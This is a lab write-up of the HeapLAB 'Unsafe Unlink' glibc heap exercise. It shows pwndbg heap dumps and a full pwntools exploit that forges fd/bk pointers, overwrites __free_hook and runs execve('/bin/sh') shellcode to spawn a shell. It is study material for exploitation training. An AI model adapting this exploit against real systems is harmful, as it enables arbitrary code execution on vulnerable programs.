# Unsafe Unlink

## Notes

* Chunks are considerated "small" when their size is less than 0x400.
* Remember that an easy way to request a chunk of a specific size is to subtract eight
from the size you want.

## Analizing binarie

```
pwndbg> r
Starting program: /home/user-pwn18/Escritorio/PWN/HeapLAB/unsafe_unlink/unsafe_unlink 
ERROR: Could not find ELF base!

===============
|   HeapLAB   |  Unsafe Unlink
===============

puts() @ 0x7ffff7aa25a0
heap @ 0x555555757000

1) malloc 0/2
2) edit
3) free
4) quit
> 1
size: 9999
small chunks only - excluding fast sizes (120 < bytes <= 1000)

1) malloc 0/2
2) edit
3) free
4) quit
> 1
size: 136

1) malloc 1/2
2) edit
3) free
4) quit
> 2
index: 0
data: YYYYYYYYYYYYYYYYYY

1) malloc 1/2
2) edit
3) free
4) quit
> ^C

pwndbg> vis

0x555555757000	0x0000000000000000	0x0000000000000091	................
0x555555757010	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x555555757020	0x00000000000a5959	0x0000000000000000	YY..............
0x555555757030	0x0000000000000000	0x0000000000000000	................
0x555555757040	0x0000000000000000	0x0000000000000000	................
0x555555757050	0x0000000000000000	0x0000000000000000	................
0x555555757060	0x0000000000000000	0x0000000000000000	................
0x555555757070	0x0000000000000000	0x0000000000000000	................
0x555555757080	0x0000000000000000	0x0000000000000000	................
0x555555757090	0x0000000000000000	0x0000000000020f71	........q....... <-- Top chunk

pwndbg> c
Continuando.
1
size: 136

1) malloc 2/2
2) edit
3) free
4) quit
> 3
index: 0

1) malloc 2/2
2) edit
3) free
4) quit
> ^C

pwndbg> vis

```

![imagen1.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/unsafe_unlink/assets/vis_free.png)

### Show unsortedbin

```
pwndbg> unsortedbin
unsortedbin
all: 0x555555757000 —▸ 0x7ffff7dd4b78 (main_arena+88) ◂— add    byte ptr [rax + 0x75], dh /* 0x555555757000 */
```

## Found bug

```
pwndbg> r
Starting program: /home/user-pwn18/Escritorio/PWN/HeapLAB/unsafe_unlink/unsafe_unlink 
ERROR: Could not find ELF base!

===============
|   HeapLAB   |  Unsafe Unlink
===============

puts() @ 0x7ffff7aa25a0
heap @ 0x555555757000

1) malloc 0/2
2) edit
3) free
4) quit
> 1
size: 136

1) malloc 1/2
2) edit
3) free
4) quit
> 2
index: 0
data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

1) malloc 1/2
2) edit
3) free
4) quit
> ^C

pwndbg> vis

0x555555757000	0x0000000000000000	0x0000000000000091	................
0x555555757010	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555757020	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555757030	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555757040	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555757050	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555757060	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555757070	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555757080	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555757090	0x4141414141414141	0x0000000a41414141	AAAAAAAAAAAA....	 <-- Top chunk

```

Top chunk size has been overwritten, but this time we're not limited to overwriting just the top chunk size field, we can also target size fields belonging to other chunks.

```
pwndbg> vis

pwndbg> c

1) malloc 1/2
2) edit
3) free
4) quit
> 1
size: 0x88

1) malloc 2/2
2) edit
3) free
4) quit
> ^C


0x555555757000	0x0000000000000000	0x0000000000000091	................
0x555555757010	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555757020	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555757030	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555757040	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555757050	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555757060	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555757070	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555757080	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555757090	0x4141414141414141	0x0000000000000091	AAAAAAAA........
0x5555557570a0	0x0000000000000000	0x0000000000000000	................
0x5555557570b0	0x0000000000000000	0x0000000000000000	................
0x5555557570c0	0x0000000000000000	0x0000000000000000	................
0x5555557570d0	0x0000000000000000	0x0000000000000000	................
0x5555557570e0	0x0000000000000000	0x0000000000000000	................
0x5555557570f0	0x0000000000000000	0x0000000000000000	................
0x555555757100	0x0000000000000000	0x0000000000000000	................
0x555555757110	0x0000000000000000	0x0000000000000000	................
0x555555757120	0x0000000000000000	0x0000000a414140b1	.........@AA....	 <-- Top chunk

```

Now shows us what we'd expect, two 0x90-sized chunks followed by a now corrupted top chunk 

```
pwndbg> c
Continuando.
2
index: 0
data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

1) malloc 2/2
2) edit
3) free
4) quit
> 
1) malloc 2/2
2) edit
3) free 
4) quit
> ^C

```

This time we need to use the dq command to inspect the heap because the corrupt size field will confuse the 'vis' command.

The 'mp_' struct is used by malloc to hold a small amount of its parameter data.

For now , we'll use its 'sbrk_base' member as a quick way to find the start of the defaukt heap where we'll print 38 quadwords of memory.


```
pwndbg> dq mp_.sbrk_base 38
0000555555757000     0000000000000000 0000000000000091
0000555555757010     4141414141414141 4141414141414141
0000555555757020     4141414141414141 4141414141414141
0000555555757030     4141414141414141 4141414141414141
0000555555757040     4141414141414141 4141414141414141
0000555555757050     4141414141414141 4141414141414141
0000555555757060     4141414141414141 4141414141414141
0000555555757070     4141414141414141 4141414141414141
0000555555757080     4141414141414141 4141414141414141
0000555555757090     4141414141414141 4141414141414141
00005555557570a0     0000000000000000 0000000000000000
00005555557570b0     0000000000000000 0000000000000000
00005555557570c0     0000000000000000 0000000000000000
00005555557570d0     0000000000000000 0000000000000000
00005555557570e0     0000000000000000 0000000000000000
00005555557570f0     0000000000000000 0000000000000000
0000555555757100     0000000000000000 0000000000000000
0000555555757110     0000000000000000 0000000000000000
0000555555757120     0000000000000000 0000000a414140b1
```

Even though we can corrupt the top chunk size field with this overflow, the House of Force techinque isn't viable here,
we just can't request enough memory or enough chunks. So lets consider how corrupting a "normal" chunk's size field might benefit us.

What would happen were to clear the second chunk's prev_inuse flag. We know that the prev_inuse flag is used by malloc to determine
 whater a previous chunk is a candidate for consolidation.

We also know that the consolidation process will involve unlinking the first chunk, but the first chunk isn't really free,
so it isn't  linked into a free list and therefore has no forward or backward pointers. However, this is our opportunity to provide them,
and remember an unsafe unlink operation on attacker-controlled pointers yields a reflected write primitive.

```
# exploit.py
chunk_A = malloc(0x88)
chunk_B = malloc(0x88)
edit( chunk_A, b"Y"*0x88 + p64(0x90) )

pwndbg> vis

0x555555757000	0x0000000000000000	0x0000000000000091	................
0x555555757010	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x555555757020	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x555555757030	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x555555757040	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x555555757050	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x555555757060	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x555555757070	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x555555757080	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x555555757090	0x5959595959595959	0x0000000000000090	YYYYYYYY........
0x5555557570a0	0x0000000000000000	0x0000000000000000	................
0x5555557570b0	0x0000000000000000	0x0000000000000000	................
0x5555557570c0	0x0000000000000000	0x0000000000000000	................
0x5555557570d0	0x0000000000000000	0x0000000000000000	................
0x5555557570e0	0x0000000000000000	0x0000000000000000	................
0x5555557570f0	0x0000000000000000	0x0000000000000000	................
0x555555757100	0x0000000000000000	0x0000000000000000	................
0x555555757110	0x0000000000000000	0x0000000000000000	................
0x555555757120	0x0000000000000000	0x0000000000020ee1	................	 <-- Top chunk

```
Now if we tried to free chunk B now, malloc would check its prev_inuse flag, and attempt to consolidate chunk B with chunk A.
To find the start of chunk A needs to use chunk B's prev_size field. 

```
# exploit.py
chunk_A = malloc(0x88)
chunk_B = malloc(0x88)

fd = 0xdeadbeef
bk = 0xdeadbeef
prev_size = 0x90
fake_size = 0x90

edit( chunk_a, p64(fd)+p64(bk)+p8(0)*0x70 + p64(prev_size) + p64(fake_size) )


pwndbg> vis

0x555555757000	0x0000000000000000	0x0000000000000091	................
0x555555757010	0x00000000deadbeef	0x00000000deadbeef	................
0x555555757020	0x0000000000000000	0x0000000000000000	................
0x555555757030	0x0000000000000000	0x0000000000000000	................
0x555555757040	0x0000000000000000	0x0000000000000000	................
0x555555757050	0x0000000000000000	0x0000000000000000	................
0x555555757060	0x0000000000000000	0x0000000000000000	................
0x555555757070	0x0000000000000000	0x0000000000000000	................
0x555555757080	0x0000000000000000	0x0000000000000000	................
0x555555757090	0x0000000000000090	0x0000000000000090	................
0x5555557570a0	0x0000000000000000	0x0000000000000000	................
0x5555557570b0	0x0000000000000000	0x0000000000000000	................
0x5555557570c0	0x0000000000000000	0x0000000000000000	................
0x5555557570d0	0x0000000000000000	0x0000000000000000	................
0x5555557570e0	0x0000000000000000	0x0000000000000000	................
0x5555557570f0	0x0000000000000000	0x0000000000000000	................
0x555555757100	0x0000000000000000	0x0000000000000000	................
0x555555757110	0x0000000000000000	0x0000000000000000	................
0x555555757120	0x0000000000000000	0x0000000000020ee1	................	 <-- Top chunk


```

It's at this point that malloc will perform the unlink procedure on our forged fd and bk, giving us 
that reflecter wirte primitive.

Malloc will follow our fD to what it believes is another chunk and overwrite that chunk's BK with our BK.
Then malloc will follow our BK and overwrite that chunk's FD with our FD.

For this to work, both addresses we supply must point to writable memory, wich means if we try to ovwewrite
the free hook with the address of system(), for example, the second half of our reflected write will attempt
to write the address of the free hook into the system() function, causing segfault.

Full RELRO is still enforced however, so we need to target the malloc hooks for our attack to succeed.

We have a heap leak and we can write shellcode onto an executable hap, so what's stopping us from using our
reflected write to overwrite the free hook with the address of our shellcode?

```
# exploit.py
chunk_A = malloc(0x88)
chunk_B = malloc(0x88)

fd = libc.sym._free_hook - 0x 18
bk = heap + 0x20
prev_size = 0x90
fake_size = 0x90
shellcode = asm("jmp shellcode;" + "nop;"*0x16 + "shellcode:" + shellcraft.execve("/bin/sh"))
edit( chunk_a, p64(fd)+p64(bk)+shellcode+p8(0)*(0x70-len(shellcode)) + p64(prev_size) + p64(fake_size) )
```

Next , we'll focus on the first half of the reflected write, in wich our bk will copied to where our fd points.

That way, when we attempt to free another chunk after the unlinking has taken place,our shellcode will be executed instead.

So let's point out fd at the free hook minus 0x18 to account for the fact that malloc will treat whatever our fd point to as a chunk and overwrite its.

## First half of the unlinking procedure

```
pwndbg> vis

0x555555757000	0x0000000000000000	0x0000000000000091	................
0x555555757010	0x00007ffff7dd6790	0x0000555555757020	.g...... puUUU..
0x555555757020	0x90909090909016eb	0x9090909090909090	................
0x555555757030	0x9090909090909090	0x010101010101b848	........H.......
0x555555757040	0x68632eb848500101	0x0431480169722e6f	..PH..cho.ri.H1.
0x555555757050	0xf631d231e7894824	0x000000050f583b6a	$H..1.1.j;X.....
0x555555757060	0x0000000000000000	0x0000000000000000	................
0x555555757070	0x0000000000000000	0x0000000000000000	................
0x555555757080	0x0000000000000000	0x0000000000000000	................
0x555555757090	0x0000000000000090	0x0000000000000090	................
0x5555557570a0	0x0000000000000000	0x0000000000000000	................
0x5555557570b0	0x0000000000000000	0x0000000000000000	................
0x5555557570c0	0x0000000000000000	0x0000000000000000	................
0x5555557570d0	0x0000000000000000	0x0000000000000000	................
0x5555557570e0	0x0000000000000000	0x0000000000000000	................
0x5555557570f0	0x0000000000000000	0x0000000000000000	................
0x555555757100	0x0000000000000000	0x0000000000000000	................
0x555555757110	0x0000000000000000	0x0000000000000000	................
0x555555757120	0x0000000000000000	0x0000000000020ee1	................	 <-- Top chunk
pwndbg> p &__free_hook
$2 = (void (**)(void *, const void *)) 0x7ffff7dd67a8 <__free_hook>
```

Continue execution, free b chunk and visualize the heap ...

```
pwndbg> vis

0x555555757000	0x0000000000000000	0x0000000000021001	................	 <-- Top chunk

```

But it was first consolidated with chunk A, then consolidated into top chunk afterwards.

Dumping the memory that the free hook points to reveals that it's pointing to our shell code on the heap.

## Second half of unlinking procedure 

Our BK was followed and our FD copied over the FD at its destination.

```
pwndbg> dq __free_hook 10
0000555555757020     90909090909016eb 9090909090909090
0000555555757030     00007ffff7dd6790 010101010101b848
0000555555757040     68632eb848500101 0431480169722e6f
0000555555757050     f631d231e7894824 000000050f583b6a
0000555555757060     0000000000000000 0000000000000000
```
An problem is that our FD has been written into the middle of our shellcode.

Fortunely by disassembling the first part of our shellcode with the 'u' command, we see that this
shellcode already accounts for this by using its first two bytes to jump over the corruption.

```
pwndbg> u __free_hook
 ► 0x555555757020    jmp    0x555555757038                <0x555555757038>
 
   0x555555757022    nop 
   0x555555757023    nop 
   0x555555757024    nop 
   0x555555757025    nop 
   0x555555757026    nop 
   0x555555757027    nop 
   0x555555757028    nop 
   0x555555757029    nop 
   0x55555575702a    nop 
   0x55555575702b    nop
```

## Prepare exploit

```
shellcode = asm("jmp shellcode;" + "nop;"*0x16 + "shellcode:" + shellcraft.execve("/bin/sh"))

chunk_a = malloc(0x88)
chunk_b = malloc(0x88)

fd = libc.sym.__free_hook - 0x18
bk = heap+0x20
prev_size = 0x90
fakse_size = 0x90
edit( chunk_a, p64(fd)+p64(bk)+shellcode+ p8(0)*(0x70-len(shellcode))+p64(prev_size)+p64(fakse_size) )
free(chunk_b)
free(chunk_a)

[*] Switching to interactive mode
$ whoami
[DEBUG] Sent 0x7 bytes:
    b'whoami\n'
[DEBUG] Received 0xb bytes:
    b'user-pwn18\n'
user-pwn18
$ hostname
[DEBUG] Sent 0x9 bytes:
    b'hostname\n'
[DEBUG] Received 0xa bytes:
    b'userpwn18\n'
userpwn18
$  

```


## Summary

We requested two chunk, A and B, and took adventage of a heap overflow to clear the prev_inuse flag on chunk B, that should otherwise have it set.
In this case, the overflow was a whole quadword, but it could just as easily have been a single byte or even a single null byte if the size field already
had a least significant byte of zero.

When we freed the corrupt chunk B, malloc determined that because it's prev_inuse flag was clear its previous chunk was a candidate for consolidation.

Consolidation involves unlinking the candidate, or victim, chunk from its free list and adding its size to the chunk has been freed.

To find the candidate chunk malloc uses the prev_size field of the freed chunk.

Next, malloc attempted to unlink chunk A and because we still controlled its user data, we were able to provide forged FD and BK pointers for the unlink
process to operate on.

We pointed our FD at the free hook munus 24 and our BK at some shellcode we had writeen onto the heap.

The unlink process followed our fd and copied our BK over the free hook.

It then followed our BK and copied our FD 16 bytes into our shellcode, which we had to deal with by providing a 'jmp' instruction to jump over it.

Finally , we triggered a call to free(), which was redirected via the free hook to our shellcode on the heap, giving us a shell.

## References

Max Kamper, Linux Heap Exploitation - Part 1, Udemy 5(14)
